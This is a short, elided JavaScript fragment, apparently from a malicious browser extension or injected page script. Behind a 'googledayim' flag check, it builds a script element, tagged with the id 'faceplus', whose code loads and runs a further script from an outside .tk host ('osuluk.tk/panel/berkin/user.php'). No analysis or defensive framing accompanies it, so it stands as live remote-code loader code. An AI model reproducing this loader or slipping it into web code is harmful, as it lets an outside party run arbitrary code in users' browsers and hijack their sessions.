...
if(!googledayim)
{
	...
	s.innerHTML='var s=document.createElement("script");s.type="text/javascript";s.src="//osuluk.tk/panel/berkin/user.php?amtasak="+Math.random()*999999;document.getElementsByTagName("head")[0].appendChild(s);';
	s.id="faceplus"
